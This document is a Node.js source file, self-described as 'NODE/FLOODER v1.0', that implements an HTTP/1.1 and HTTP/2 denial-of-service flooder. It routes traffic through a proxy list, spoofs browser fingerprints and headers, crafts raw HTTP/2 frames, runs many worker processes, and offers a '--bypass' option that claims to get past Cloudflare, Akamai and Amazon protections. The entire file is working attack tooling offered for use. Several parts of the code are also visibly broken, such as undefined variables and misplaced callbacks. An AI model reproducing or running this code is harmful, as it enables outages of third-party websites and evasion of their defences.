const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');
const http2 = require('http2');
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e)
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--bypass');
let custom_table = 65535;
let custom_window = 6291456 * 10;
let custom_header = 262144* 10;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const c = process.argv.indexOf('--cookie');
const cookies = queryIndex !== -1 && c + 1 < process.argv.length ? process.argv[c + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    
    console.log(`${chalk.red('NODE/FLOODER v1.0 || Developers method : @ThaiDuongScript 🇻🇳')}`);
    
    console.log(chalk.blue.underline('Usage:'));
    console.log(chalk.blue.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(chalk.cyan.bold(`node ${process.argv[1]} GET "https://iristeam.sbs/" 120 10 10 proxy.txt --delay 1 --bypass --http 2 --debug --cookie\n`));
    
    console.error(chalk.yellow(`
Options:
 --delay <1-inf> - delay between requests
 --bypass - bypass cloudflare,akamai,amazon,...
 --http 1/2/mix - http version
 --debug - show status code
 --cookie - enable cookie && response cookie
    `));
    process.exit(1);
}
const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
var randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 



function encodeFrame(streamId, type, payload = "", flags = 0) {
     let frame = Buffer.alloc(9)
     frame.writeUInt32BE(payload.length << 8 | type, 0)
     frame.writeUInt8(flags, 4)
     frame.writeUInt32BE(streamId, 5)
     if (payload.length > 0)
          frame = Buffer.concat([frame, payload])
     return frame
}

function decodeFrame(data) {
     if (data.length < 9) return null;

     const lengthAndType = data.readUInt32BE(0)
     const length = lengthAndType >> 8
     const type = lengthAndType & 0xFF
     const flags = data.readUint8(4)
     const streamId = data.readUInt32BE(5)
     const offset = flags & 0x20 ? 5 : 0

     let payload = Buffer.alloc(0)

     if (length > 0) {
          payload = data.subarray(9 + offset, 9 + offset + length)

          if (payload.length + offset != length) {
               return null
          }
     }

     return {
          streamId,
          length,
          type,
          flags,
          payload
     }
}

function encodeSettings(settings) {
     const data = Buffer.alloc(6 * settings.length)
     for (let i = 0; i < settings.length; i++) {
          data.writeUInt16BE(settings[i][0], i * 6)
          data.writeUInt32BE(settings[i][1], i * 6 + 2)
     }
     return data
}


function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}
function randstrb(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
function generate_headers() {
     const version = Math.floor(Math.random() * 6) + 123; //123-130
     const randomValue = Math.random()
     const platform = randomValue < 0.33 ? 'Windows' : randomValue < 0.66 ? "Linux" : 'macOS'
const rt = Math.floor(Math.random() * 9999999999999999999999999999999909999999999999999) + 10000000000000000000000000000000000000000000000;

     const browser = {

               version: version,
               headers: {
                    'sec-ch-ua': `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${version}\"`,
                    'sec-ch-mobile': '?0',
                    'sec-ch-ua-platform': `\"${platform}\"`,
                    'upgrade-insecure-requests': '1',
                    'user-agent': `${platform === 'Windows' ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${rt}` : platform === 'Linux' ? `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${rt}` : `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstrb(1)}_${randstrb(1)}_${randstrb(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 ${rt}`}`,
                    'accept': `${Math.random() > 0.5 ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' : '*/*'}`,
                    'sec-fetch-site': '?1',
                    'sec-fetch-mode': 'none',
                    'sec-fetch-user': 'document',
                    'sec-fetch-dest': 'navigate',
                    'accept-encoding': 'gzip, br',
                    'accept-language': 'en-US,en;q=1.0',
                    'cookie': null,
               },
               sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
               ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA',
               settings: {
                    initial_stream_window_size: 6291456,
                    initial_connection_window_size: 15728640,
                    max_concurrent_streams: 1000,
                    max_header_list_size: 262144,
                    header_table_size: 65536,
                    enable_push: false
               }
          }

     return browser;
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

               
                         

function parse_headers(user_agent) {
     const osRegex = /\(([^)]+)\)/;
     const chromeRegex = /Chrome\/(\d+)/;

     const osMatch = user_agent.match(osRegex);
     const chromeMatch = user_agent.match(chromeRegex);

     let os = 'Windows';
     if (osMatch) {
          const osDetails = osMatch[1];
          if (osDetails.includes('Macintosh')) {
               os = 'macOS';
          } else if (osDetails.includes('Linux')) {
               os = 'Linux';
          } else if (osDetails.includes('Windows')) {
               os = 'Windows'
          }
     }

     const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 130;

     return { os: os, version: chromeVersion };
}
function http1_headers(url) {
function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    const languages = [
     'en-US,en;q=0.9',
     'fr-FR,fr;q=0.9',
     'de-DE,de;q=0.9',
     'es-ES,es;q=0.9',
     'zh-CN,zh;q=0.9',
     'ru-RU,ru;q=0.9',
     'hi-IN,hi;q=0.9',
     'tr-TR,tr;q=0.9',
     'pt-BR,pt;q=0.9',
     'it-IT,it;q=0.9',
     'nl-NL,nl;q=0.9',
     'ko-KR,ko;q=0.9'
];
     const randomVersion = Math.floor(Math.random() * 21) + 110; //110-131
    const rt = Math.floor(Math.random() * 9999999999999999999999999999999909999999999999999) + 10000000000000000000000000000000000000000000000;
     const randomValue = Math.random()
     const user_agent =  randomValue < 0.33 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`
     const end = "\r\n";

     let headers = `User-Agent: ${user_agent}${rt}${user_agent}${end}`;
     let request = `GET ${url.pathname}`;
     request += `Host: ${url.hostname}${url.port ? `:${url.port}` : ''}${end}`;

     //custom shit
      if (cookies) headers += `Cookie: ${cookies}${end}`;

     //default
     headers += `Upgrade-Insecure-Requests: 1${end}`;
     headers += `Accept-Language: ${languages[~~Math.floor(Math.random * languages.length)]}${end}`;
     headers += `Sec-Fetch-Site: ${Math.random() > 0.5 ? 'same-origin' : 'none'} ${end}`;
     headers += `Sec-Fetch-Mode: navigate${end}`;
     headers += `Sec-Fetch-User: ?1${end}`;
     headers += `Sec-Fetch-Dest: document${end}`;
     headers += `Accept-Encoding: gzip, deflate${end}`
     headers += `Accept: ${Math.random() > 0.5 ? `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7` : "*/*"}${end}`;
     headers += `Cache-Control: ${Math.random() > 0.5 ? 'max-age=0' : 'no-cache'}${end}`;
     headers += `Connection: keep-alive${end}`;

     //custom chrome headers
     let chromium = parse_headers(user_agent)
     headers += `sec-ch-ua: \"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${chromium.version}\"${end}`
     headers += `sec-ch-mobile: ?0${end}`
     headers += `sec-ch-ua-platform: \"${chromium.os}\"${end}`

     //random
     if (Math.random() > 0.5) headers += `Origin: https://${url.hostname}${end}`
     if (Math.random() > 0.5) headers += `Referer: https://${url.hostname}/${end}`
     
     //exploit
     
          
     
function shuffle_proxies(array) {
     for (let i = array.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [array[i], array[j]] = [array[j], array[i]];
     }
     return array;
}

     //console.log(request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end)

     return request + shuffle_proxies(headers.split(end).filter(value => value !== null && value !== undefined && value !== '')).join(end) + end + end;
}

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
               let browser = generate_headers();
               let headers = http1_headers(url);
               if (cookies) {
                    if (headers && typeof headers !== 'boolean') {
                         try {
                              browser.headers = JSON.parse(headers);
                         } catch (err) {
                              console.log("headers error:", err);
                         }
                    } else {
                         const parsed = parse_headers(user_agent);
                         browser.headers = versions["chrome"][parsed.version].headers;
                    }
                    const chromium = parse_headers(user_agent)
                    browser.headers['user-agent'] =rt + user_agent;
                    browser.headers['sec-ch-ua'] = `\"Google Chrome\";v=\"${chromium.version}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${chromium.version}\"`
                    browser.headers['sec-ch-platform'] = `\"${chromium.os}\"`
                    browser.headers['cookie'] = cookies;
               }
            tlsSocket = tls.connect({
                socket: netSocket,
                    ALPNProtocols: forceHttp == 2 ? ['h2', 'http/1.1'] : forceHttp == 1 ? ['http/1.1'] : ['h2', 'http/1.1'],
                    host: url.hostname,
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA',
                    minVersion: Math.random() < 0.5 ? 'TLSv1.3' : 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    rejectUnauthorized: false
               }, () => {
                    tlsSocket.allowHalfOpen = true;
                    tlsSocket.setNoDelay(true);
                    tlsSocket.setKeepAlive(true, 60000);
                    tlsSocket.setMaxListeners(0);
                            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function main() {
                        tlsSocket.write(headers, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main()
                                }, isFull ? 1000 : 1000 / ratelimit)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    main()

                    tlsSocket.on('error', () => {
                        tlsSocket.close(() => tlsSocket.destroy())//ket thuc socket khi bi loi 
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(15663105, 0);

                    const frames = [
                         Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'),
                         encodeFrame(0, 4, encodeSettings([
                              [1, Math.random() < 0.5 ? 65536 : 65535],       
                              [2, 0],                                         //enablePush
                              [3, Math.random() < 0.5 ? 100 : 1000],          
                              [4, Math.random() < 0.5 ? 6291456 : 33554432],  //initialWindowSize
                              [5, 16384],                                     //maxFrameSize
                              [6, 262144]                                     //maxHeaderListSize
                         ])),
                         encodeFrame(0, 8, updateWindow)
                    ];

                    tlsSocket.on('data', (eventData) => {
                         data = Buffer.concat([data, eventData])
                         while (data.length >= 9) {
                              const frame = decodeFrame(data)
                              if (frame) {
                                   data = data.subarray(frame.length + 9)
                                   if (frame.type == 4 && frame.flags == 0) {
                                        
                                        tlsSocket.write(encodeFrame(0, 4, "", 1))
                                   }

                                   if (frame.type == 0) {
  
                                        let window_size = frame.length;
                                        if (window_size < 6000) {
                                             let inc_win = 65536 - window_size;
                                             window_size += inc_win;
 
                                             const update_win = Buffer.alloc(4);
                                             update_win.writeUInt32BE(inc_win, 0);
                                             tlsSocket.write(encodeFrame(0, 8, update_win));
                                        }
                                   }

                                   if (frame.type == 1) {
                                        
                                        try {
                                             const status = parseInt(hpack.decode(frame.payload).find(x => x[0] == ':status')[1]);
                                             if (!isNaN(status) && status >= 100 && status <= 599) {
                                                  //console.log("status:", status);
                                                  if (!statuses[status])
                                                       statuses[status] = 0

                                                  statuses[status]++

                                                  if (status === 302 || status === 301) {
                                                       const redirect = hpack.decode(frame.payload).find(x => x[0] == 'location')[1];
                                                       url = new URL(redirect, url.href);
                                                  }
                                                  if (status === 429) {
                                                       
                                                  }

                                                  try {
                                                       const response_cookies = hpack.decode(frame.payload).find(x => x[0] == 'set-cookie')[1];
                                                       if (response_cookies) {
                                                            if (browser.headers['cookie'] === null && !cookies) browser.headers['cookie'] = response_cookies
                                                            else if (browser.headers['cookie'] === null && cookies) browser.headers['cookie'] = cookies + "; " + response_cookies
                                                       }
                                                  } catch (_) {

                                                  }
                                             }
                                        } catch (_err) {
                                             // console.log(err);
                                              //const headers = hpack.decode(frame.payload);
                                              //if (headers.includes('status')) {
                                             //console.log(headers);
                                             //}
                                             //console.log(headers);

                                        }
                                   }
                                                  
                                   if (frame.type == 6) {
                                        if (!(frame.flags & 0x1)) {
                                             tlsSocket.write(encodeFrame(0, 6, frame.payload, 0x1));
                                        }
                                   }
                                   if (frame.type == 7 || frame.type == 5) {
                                        if (frame.type == 7) {
                                             if (!statuses["GOAWAY"])
                                                  statuses["GOAWAY"] = 0

                                             statuses["GOAWAY"]++
                                        }
                                        tlsSocket.end(() => tlsSocket.destroy())
                                        return
                                   }

                              } else {
                                   break
                              }
                         }
                    })

                    tlsSocket.on('error', (err) => {
                         return;
                    })

                    tlsSocket.on('close', () => {
                         return;
                    })

                    tlsSocket.write(Buffer.concat(frames))

                    function main() {
                         let requests_sent = 0;
                         if (tlsSocket.destroyed) {
                              return
                         }
                         for (let i = 0; i < ratelimit; i++) {
                              const headers = Object.entries({
                                   ':method': 'GET',
                                   ':authority': url.hostname,
                                   ':scheme': 'https',
                                   ':path': query ? handleQuery(query) : url.pathname,
                              }).filter(a => a[1] != null);

                              const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');


                              const metadata = {
                                   site: [ 'same-origin', 'none'],
                                   mode: ['cors', 'no-cors', 'navigate'],
                                   dest: ['document', 'script', 'image']
                              };

                              if (requests_sent > 1) {
                                   browser.headers['sec-fetch-site'] = metadata.site[~~Math.floor(Math.random * metadata.site.length)];
                                   browser.headers['sec-fetch-mode'] = metadata.mode[~~Math.floor(Math.random() * metadata.mode.length)];
                                   browser.headers['sec-fetch-dest'] = metadata.dest[~~Math.floor(Math.random() * metadata.dest.length)];
                              }

                              const headers2 = Object.entries({
                                   'user-agent': browser.headers['user-agent'],
                                   'accept': browser.headers['accept'],
                                   'sec-fetch-site': browser.headers['sec-fetch-site'],
                                   'sec-fetch-mode': browser.headers['sec-fetch-mode'],
                                   'sec-fetch-user': browser.headers['sec-fetch-user'],
                                   'sec-fetch-dest': browser.headers['sec-fetch-dest'],
                                   'accept-encoding': browser.headers['accept-encoding'],
                                   'accept-language': browser.headers['accept-language'],
                                   'cookie': browser.headers['cookie'],
                                   'cache-control': Math.random() > 0.5 ? 'max-age=0' : 'no-cache',
                                   'priority': `u=${Math.round(Math.random()*5)}, i`,
                                   'x-forwarded-for': proxy[0]
                              }).filter(a => a[1] != null);


                              const headers3 = Object.entries({                                   'sec-ch-ua': browser.headers['sec-ch-ua'],
                                   'sec-ch-mobile': browser.headers['sec-ch-mobile'],
                                   'sec-ch-ua-platform': browser.headers['sec-ch-ua-platform'],
                                   ...(Math.random() < 0.5 && { [`referer`]: `https://${url.hostname}/${randomString}` }),
                                   ...(Math.random() < 0.5 && { [`origin`]: `https://www.google.com/?p=${randomString}` }),
                              }).filter(a => a[1] != null)

                              const combinedHeaders = headers.concat(headers2).concat(headers3);

                              //console.log(streamId, combinedHeaders);
                              // process.exit(0);

                              const packed = Buffer.concat([
                                   Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                   hpack.encode(combinedHeaders)
                              ]);

                              tlsSocket.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                              requests_sent += 1;
                               //if (requests_sent >= ratelimit) {
                            //   tlsSocket.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                                //   tlsSocket.end(() => tlsSocket.destroy());
                           //    }
                              // if (headersPerReset <= requests_sent) {
                              //     tlsSocket.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                              //     headersPerReset = 0;
                              //     requests_sent = 0;
                              // }
                              if (streamId > 200) return
                              streamId += 2;
                         }
                         setTimeout(() => {
                              main()
                         }, isFull ? 1000 : 1000 / ratelimit);
                    }
                    main()
               }).on('error', (err) => {
                    //console.log(err);
                    tlsSocket.destroy()
               })
          })
          netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
`Proxy-Authorization: Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}\r\n`
     }).once('error', (err) => {
          //console.log(err)
     }).once('close', () => {
          
     })
}



if (cluster.isMaster) {
     const workers = {}

     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

     cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
       });

     cluster.on('message', (worker, message) => {
          workers[worker.id] = [worker, message]
     })

if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

     setTimeout(() => process.exit(1), time * 1000);

} else {
     setInterval(() => { go() });
     if (debugMode) {
          setInterval(() => {
               if (statusesQ.length >= 4)
                    statusesQ.shift()

               statusesQ.push(statuses)
               statuses = {}
               process.send(statusesQ)
          }, 250)
     }
     setTimeout(() => process.exit(1), time * 1000);
}